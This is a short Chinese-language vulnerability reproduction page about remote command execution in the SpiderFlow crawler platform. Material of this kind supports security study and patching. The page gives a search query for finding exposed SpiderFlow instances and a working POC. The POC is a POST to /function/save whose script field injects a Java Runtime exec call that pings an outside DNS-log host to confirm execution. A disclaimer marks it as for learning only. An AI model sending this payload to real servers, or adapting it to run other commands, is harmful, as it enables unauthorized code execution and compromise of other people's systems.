---
title: "SpiderFlow save 远程命令执行漏洞"
date: 2026-10-16 09:09:21
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "SpiderFlow-save"
tags:
  - "SpiderFlow-save"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

SpiderFlow 平台以流程图的⽅式定义爬虫，是⼀个高度灵活可配置的爬虫平台

官⽹：https://www.spiderflow.org/

## 漏洞影响

```
SpiderFlow
```

## 网络测绘

```
title=="SpiderFlow"
```

## 漏洞复现

主页面

![image-20220524153437590](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241534681.png)

发送请求包执行命令

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /function/save

id=&amp;name=cmd&amp;parameter=yw&amp;script=}Java.type('java.lang.Runtime').getRuntime().&#101;xec('ping chwd71.dnslog.cn');{</code></pre>

</details>

![image-20220524153448336](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241534389.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/SpiderFlow-save-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
